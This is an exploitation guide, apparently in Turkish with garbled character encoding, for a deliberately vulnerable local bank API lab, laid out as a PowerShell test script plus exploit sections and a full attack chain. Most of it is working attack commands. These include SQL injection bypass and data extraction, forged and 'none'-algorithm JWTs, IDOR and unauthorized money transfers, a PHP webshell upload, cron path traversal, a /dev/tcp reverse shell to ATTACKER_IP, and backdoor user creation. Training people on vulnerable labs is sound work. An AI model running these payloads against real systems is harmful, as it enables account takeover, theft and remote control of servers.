# Vulnerable Bank API - Exploitation Guide

## Kurulum

```bash
# Sanal ortam oluÅŸtur
python -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate

# BaÄŸÄ±mlÄ±lÄ±klarÄ± yÃ¼kle
pip install -r requirements.txt

# UygulamayÄ± Ã§alÄ±ÅŸtÄ±r
python app.py
```

API ÅŸu adreste Ã§alÄ±ÅŸacak: `http://localhost:5000`

---

## ğŸ¯ 34 Zafiyet ve Exploit SenaryolarÄ±
## 8 Zafiyeti Powershellde test etme komutu ##
```# vulnerable_bank_tests.ps1

$baseUrl = "http://localhost:5000"
$token = $null

Write-Host @"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     Vulnerable Bank API - PowerShell Test Suite      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"@ -ForegroundColor Cyan

# ============================================================================
# TEST 1: SQL Injection - Login Bypass
# ============================================================================
Write-Host "`n[TEST 1] SQL Injection - Authentication Bypass" -ForegroundColor Yellow

$sqlBody = @{
    username = "admin' OR '1'='1"
    password = "x"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "$baseUrl/api/login" `
      -Method Post `
      -Body $sqlBody `
      -ContentType "application/json"
    
    $token = $response.token
    Write-Host "[âœ“] SQL Injection SUCCESSFUL!" -ForegroundColor Green
    Write-Host "    Token: $($token.Substring(0,50))..." -ForegroundColor Gray
} catch {
    Write-Host "[âœ—] SQL Injection FAILED" -ForegroundColor Red
}

# ============================================================================
# TEST 2: Debug Config Exposure
# ============================================================================
Write-Host "`n[TEST 2] Debug Configuration Exposure" -ForegroundColor Yellow

try {
    $config = Invoke-RestMethod -Uri "$baseUrl/api/debug/config" -Method Get
    Write-Host "[âœ“] Config Exposed!" -ForegroundColor Green
    Write-Host "    SECRET_KEY: $($config.SECRET_KEY)" -ForegroundColor Gray
} catch {
    Write-Host "[âœ—] Config Protected" -ForegroundColor Red
}

# ============================================================================
# TEST 3: Normal Login (Get Valid Token)
# ============================================================================
Write-Host "`n[TEST 3] Normal Login" -ForegroundColor Yellow

$loginBody = @{
    username = "alice"
    password = "password123"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "$baseUrl/api/login" `
      -Method Post `
      -Body $loginBody `
      -ContentType "application/json"
    
    $token = $response.token
    Write-Host "[âœ“] Login successful as alice" -ForegroundColor Green
} catch {
    Write-Host "[âœ—] Login failed" -ForegroundColor Red
}

# ============================================================================
# TEST 4: IDOR - View Other User's Account
# ============================================================================
Write-Host "`n[TEST 4] IDOR - Access Other User's Account" -ForegroundColor Yellow

$headers = @{
    "Authorization" = "Bearer $token"
}

try {
    # Alice tries to view Bob's account (account_id = 4)
    $account = Invoke-RestMethod -Uri "$baseUrl/api/account/4" `
      -Method Get `
      -Headers $headers
    
    Write-Host "[âœ“] IDOR Successful! Accessed Bob's account" -ForegroundColor Green
    Write-Host "    Account Number: $($account.account_number)" -ForegroundColor Gray
    Write-Host "    Balance: `$$($account.balance)" -ForegroundColor Gray
} catch {
    Write-Host "[âœ—] IDOR Protected" -ForegroundColor Red
}

# ============================================================================
# TEST 5: Excessive Data Exposure
# ============================================================================
Write-Host "`n[TEST 5] Excessive Data Exposure" -ForegroundColor Yellow

try {
    $users = Invoke-RestMethod -Uri "$baseUrl/api/users" `
      -Method Get `
      -Headers $headers
    
    $hasPassword = $users.users | Where-Object { $_.password -ne $null }
    $hasSSN = $users.users | Where-Object { $_.ssn -ne $null }
    
    if ($hasPassword -or $hasSSN) {
        Write-Host "[âœ“] Sensitive Data Exposed!" -ForegroundColor Green
        Write-Host "    Found: Passwords, SSNs, Emails" -ForegroundColor Gray
    }
} catch {
    Write-Host "[âœ—] Data Protected" -ForegroundColor Red
}

# ============================================================================
# TEST 6: Mass Assignment - Privilege Escalation
# ============================================================================
Write-Host "`n[TEST 6] Mass Assignment - Become Admin" -ForegroundColor Yellow

$updateBody = @{
    role = "admin"
} | ConvertTo-Json

try {
    # Alice tries to make herself admin (user_id = 2)
    $result = Invoke-RestMethod -Uri "$baseUrl/api/user/2" `
      -Method Put `
      -Body $updateBody `
      -Headers $headers `
      -ContentType "application/json"
    
    Write-Host "[âœ“] Privilege Escalation Successful!" -ForegroundColor Green
    Write-Host "    Alice is now: $($result.user.role)" -ForegroundColor Gray
    
    # Get new token with admin role
    $newLogin = Invoke-RestMethod -Uri "$baseUrl/api/login" `
      -Method Post `
      -Body $loginBody `
      -ContentType "application/json"
    
    $token = $newLogin.token
} catch {
    Write-Host "[âœ—] Mass Assignment Protected" -ForegroundColor Red
}

# ============================================================================
# TEST 7: BOLA - Unauthorized Transfer
# ============================================================================
Write-Host "`n[TEST 7] BOLA - Transfer from Bob's Account" -ForegroundColor Yellow

$transferBody = @{
    from_account_id = 4  # Bob's account
    to_account_id = 2    # Alice's account
    amount = 500
    description = "Unauthorized transfer"
} | ConvertTo-Json

try {
    $transfer = Invoke-RestMethod -Uri "$baseUrl/api/transfer" `
      -Method Post `
      -Body $transferBody `
      -Headers $headers `
      -ContentType "application/json"
    
    Write-Host "[âœ“] Unauthorized Transfer Successful!" -ForegroundColor Green
    Write-Host "    Stole `$500 from Bob's account" -ForegroundColor Gray
} catch {
    Write-Host "[âœ—] Transfer Protected" -ForegroundColor Red
}

# ============================================================================
# TEST 8: SQL Injection - User Endpoint
# ============================================================================
Write-Host "`n[TEST 8] SQL Injection - User Enumeration" -ForegroundColor Yellow

try {
    $sqli = Invoke-RestMethod -Uri "$baseUrl/api/user/1 OR 1=1" `
      -Method Get `
      -Headers $headers
    
    Write-Host "[âœ“] SQL Injection in User Endpoint!" -ForegroundColor Green
} catch {
    Write-Host "[âœ—] SQL Injection Blocked" -ForegroundColor Red
}

# ============================================================================
# SUMMARY
# ============================================================================
Write-Host "`n" -NoNewline
Write-Host "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Cyan
Write-Host "â•‘                  TEST SUMMARY                         â•‘" -ForegroundColor Cyan
Write-Host "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Cyan
Write-Host "`nAll tests completed! Check results above." -ForegroundColor Yellow
Write-Host "For detailed exploitation, see EXPLOITATION_GUIDE.md`n" -ForegroundColor Gray
```



### ZAFIYET 1-5: Authentication & JWT Issues

#### ZAFIYET 1: Hardcoded Secret Key
**Lokasyon:** `app.py:17`
```python
app.config['SECRET_KEY'] = 'secret123'
```

**Exploit:**
```bash
# JWT token'Ä± kÄ±rma
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Manuel brute force
import jwt
secret = 'secret123'
token = jwt.encode({'user_id': 1, 'role': 'admin'}, secret, algorithm='HS256')
```

#### ZAFIYET 5: Algorithm Confusion Attack
**Lokasyon:** `app.py:87`
```python
jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256', 'none'])
```

**Exploit:**
```python
# "none" algoritmasÄ± ile token oluÅŸtur
import jwt
import base64

header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.urlsafe_b64encode(b'{"user_id":1,"role":"admin"}').decode().rstrip('=')
malicious_token = f"{header}.{payload}."

# Test et
curl -H "Authorization: Bearer {malicious_token}" http://localhost:5000/api/users
```

---

### ZAFIYET 10, 16, 26: SQL Injection Vulnerabilities

#### ZAFIYET 10: Login SQL Injection
**Lokasyon:** `app.py:138-140`
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Exploit - Authentication Bypass:**
```bash
# Burp Suite ile test
POST /api/login HTTP/1.1
Content-Type: application/json

{
    "username": "admin' OR '1'='1",
    "password": "anything"
}

# cURL ile
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "x"}'
```

**Exploit - Data Extraction:**
```bash
# TÃ¼m kullanÄ±cÄ±larÄ± listele
username: admin' UNION SELECT 1,username,email,password,full_name,ssn,phone,role FROM users--

# SQLMap ile otomatik
sqlmap -r login_request.txt --dump --batch
```

#### ZAFIYET 16: User ID SQL Injection
**Lokasyon:** `app.py:183-185`
```python
query = f"SELECT * FROM users WHERE id = {user_id}"
```

**Exploit:**
```bash
# Ã–nce login olup token al
TOKEN=$(curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# SQL injection ile tÃ¼m kullanÄ±cÄ±larÄ± Ã§ek
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/user/1 UNION SELECT NULL,username,email,password,ssn,phone,role,NULL FROM users--"

# Admin ÅŸifresini Ã§al
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/user/1 OR 1=1--"

# VeritabanÄ± yapÄ±sÄ±nÄ± keÅŸfet
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/user/1 UNION SELECT 1,2,3,4,sql,6,7,8 FROM sqlite_master--"
```

#### ZAFIYET 26: Search SQL Injection
**Lokasyon:** `app.py:283-285`

**Exploit - Boolean-based Blind SQLi:**
```bash
# True condition (response dÃ¶ner)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/search?q=alice' AND '1'='1"

# False condition (response dÃ¶nmez)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/search?q=alice' AND '1'='2"

# Admin ÅŸifresini karakter karakter Ã§ek
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/search?q=x' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='a'--"
```

---

### ZAFIYET 17-20: IDOR (Insecure Direct Object Reference)

#### ZAFIYET 17: User Update IDOR
**Lokasyon:** `app.py:205-225`

**Exploit:**
```bash
# Alice olarak login ol
ALICE_TOKEN=$(curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Bob'un bilgilerini deÄŸiÅŸtir (user_id=3)
curl -X PUT http://localhost:5000/api/user/3 \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacked@evil.com",
    "role": "user"
  }'
```

#### ZAFIYET 18: Mass Assignment - Privilege Escalation
**Lokasyon:** `app.py:216-219`

**Exploit - Alice kendini admin yapar:**
```bash
# Alice kendi user_id'sini Ã¶ÄŸren (genelde response'ta var)
# Alice user_id = 2

curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": "admin"
  }'

# ArtÄ±k admin yetkileriyle token al
ADMIN_TOKEN=$(curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Admin endpoint'lerine eriÅŸebilirsin
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5000/api/admin/users
```

#### ZAFIYET 20: Account Balance IDOR
**Lokasyon:** `app.py:238-245`

**Exploit - TÃ¼m hesap bakiyelerini gÃ¶r:**
```bash
# Alice token'Ä± ile Bob'un hesabÄ±nÄ± gÃ¶rÃ¼ntÃ¼le
curl -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5000/api/account/4

# Burp Intruder ile tÃ¼m hesaplarÄ± tara
# Account ID: 1-100 arasÄ± dene
curl -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5000/api/account/Â§1Â§
```

---

### ZAFIYET 21: BOLA - Transfer Money from Any Account

#### ZAFIYET 21: Broken Object Level Authorization
**Lokasyon:** `app.py:247-280`

**Exploit - Bob'un hesabÄ±ndan Alice'e para transfer et:**
```bash
# Alice olarak login
ALICE_TOKEN=$(curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Bob'un hesabÄ± (account_id=4) -> Alice'in hesabÄ± (account_id=2)
curl -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 4,
    "to_account_id": 2,
    "amount": 1000,
    "description": "Stolen money"
  }'

# Admin hesabÄ±ndan Ã§al
curl -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 1,
    "to_account_id": 2,
    "amount": 50000,
    "description": "Bank robbery"
  }'
```

#### ZAFIYET 22: Negative Amount Attack
```bash
# Negatif miktar ile para "Ã§al" (hesaba eklenir)
curl -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 2,
    "to_account_id": 2,
    "amount": -10000,
    "description": "Integer overflow"
  }'
```

---

### ZAFIYET 2, 13-15: Excessive Data Exposure

#### ZAFIYET 2 & 15: Password ve SSN Exposure
**Lokasyon:** `app.py:36-47`

**Exploit:**
```bash
# TÃ¼m kullanÄ±cÄ±larÄ± Ã§ek - passwords ve SSN'ler gÃ¶rÃ¼nÃ¼r
curl -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5000/api/users | jq '.'

# Output:
{
  "users": [
    {
      "password": "pbkdf2:sha256:...",  # Hash bile exposed!
      "ssn": "123-45-6789",
      "email": "admin@bank.com",
      ...
    }
  ]
}
```

---

### ZAFIYET 27-28: Information Disclosure

#### ZAFIYET 27: Debug Endpoint Exposed
**Lokasyon:** `app.py:309-318`

**Exploit:**
```bash
# Secret key ve config'leri Ã§ek (authentication gerekmez!)
curl http://localhost:5000/api/debug/config

# Output:
{
  "SECRET_KEY": "secret123",
  "DATABASE_URI": "sqlite:///bank.db",
  "ENV": {
    "HOME": "/home/user",
    "AWS_ACCESS_KEY": "...",  # EÄŸer ortamda varsa
    ...
  }
}
```

---

### ZAFIYET 29-32: Unrestricted File Upload

#### ZAFIYET 29-32: Arbitrary File Upload
**Lokasyon:** `app.py:320-338`

**Exploit - Webshell Upload:**
```bash
# PHP webshell oluÅŸtur
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload et
curl -X POST http://localhost:5000/api/file/upload \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -F "file=@shell.php"

# Path traversal ile kritik dosyalara yaz
curl -X POST http://localhost:5000/api/file/upload \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -F "file=@malicious.txt;filename=../../../etc/cron.d/backdoor"
```

---

### ZAFIYET 33: Remote Code Execution (RCE)

#### ZAFIYET 33: Command Injection
**Lokasyon:** `app.py:340-355`

**Exploit:**
```bash
# Ã–nce kendini admin yap (mass assignment ile)
# Sonra command Ã§alÄ±ÅŸtÄ±r

curl -X POST http://localhost:5000/api/exec \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "cat /etc/passwd"
  }'

# Reverse shell
curl -X POST http://localhost:5000/api/exec \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
  }'

# Backdoor user ekle
curl -X POST http://localhost:5000/api/exec \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "useradd -m -p $(openssl passwd -1 hacker123) backdoor"
  }'
```

---

## ğŸ”— Tam Exploit Chain - SÄ±fÄ±rdan Root

```bash
#!/bin/bash
# Full exploitation chain

echo "[1] SQL Injection ile admin bypass"
TOKEN=$(curl -s -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}' | jq -r '.token')

echo "[2] Debug endpoint'ten secret key Ã§al"
SECRET=$(curl -s http://localhost:5000/api/debug/config | jq -r '.SECRET_KEY')

echo "[3] Kendi token'Ä±mÄ±zÄ± oluÅŸtur"
FAKE_TOKEN=$(python3 -c "import jwt; print(jwt.encode({'user_id':999,'username':'hacker','role':'admin'}, '$SECRET', algorithm='HS256'))")

echo "[4] Mass assignment ile kendimizi admin yapalÄ±m"
curl -s -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' > /dev/null

echo "[5] BOLA ile admin parasÄ±nÄ± Ã§al"
curl -s -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id":1,"to_account_id":2,"amount":50000}' > /dev/null

echo "[6] RCE ile sistem kontrolÃ¼nÃ¼ al"
curl -s -X POST http://localhost:5000/api/exec \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}' | jq -r '.output'

echo "[+] Full compromise achieved!"
```

---

## ğŸ“Š Burp Suite Test SenaryolarÄ±

### 1. SQL Injection TaramasÄ±

**Burp Suite > Proxy > Intercept:**
```http
POST /api/login HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"username":"admin'","password":"test"}
```

**Burp Suite > Repeater:**
- `admin'` â†’ Syntax error (SQL injection mevcut)
- `admin' OR '1'='1` â†’ BaÅŸarÄ±lÄ± login
- `admin' UNION SELECT NULL,NULL,NULL...` â†’ Data extraction

**Burp Suite > Intruder:**
- Payload type: Runtime file
- Payload: `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt`

### 2. IDOR Fuzzing

**Burp Suite > Intruder > Positions:**
```http
GET /api/account/Â§1Â§ HTTP/1.1
Authorization: Bearer alice_token
```

**Payload:**
- Payload type: Numbers
- From: 1, To: 100, Step: 1

**Grep - Match:** `"balance"` (baÅŸarÄ±lÄ± eriÅŸimleri bul)

### 3. JWT Manipulation

**Burp Suite Extensions:**
- JSON Web Token Attacker
- JWT Editor

**Test:**
1. Intercept login response
2. Decode JWT (jwt.io)
3. DeÄŸiÅŸtir: `{"role": "user"}` â†’ `{"role": "admin"}`
4. Re-sign with weak secret
5. Replace token and forward

---

## ğŸ›¡ï¸ Zafiyet Ã–zeti (CVSS SkorlarÄ±)

| ID | Zafiyet | CVSS | Kategori |
|----|---------|------|----------|
| 10, 16, 26 | SQL Injection | 9.8 | Injection |
| 21 | BOLA | 8.8 | Broken Access Control |
| 33 | Command Injection | 9.9 | Injection |
| 17, 18 | IDOR + Mass Assignment | 8.1 | Broken Access Control |
| 27 | Config Exposure | 7.5 | Security Misconfiguration |
| 1 | Weak Secret | 7.5 | Cryptographic Failure |
| 29-32 | File Upload | 8.6 | Injection |
| 2, 15 | Data Exposure | 7.5 | Information Disclosure |

**Toplam:** 34 kritik ve yÃ¼ksek seviye zafiyet

---

## ğŸ“ Pentest Raporu Ä°Ã§in Notlar

Her exploit iÃ§in ÅŸunlarÄ± dokÃ¼mante edin:
1. **Zafiyet aÃ§Ä±klamasÄ±** (teknik detay)
2. **Proof of Concept** (curl komutu + screenshot)
3. **Impact** (ne olabilir?)
4. **Remediation** (nasÄ±l dÃ¼zeltilir?)
5. **CVSS skoru** ve justification

Burp Suite'ten:
- HTTP request/response ekran gÃ¶rÃ¼ntÃ¼leri
- Scanner sonuÃ§larÄ±
- Intruder attack grafikleri
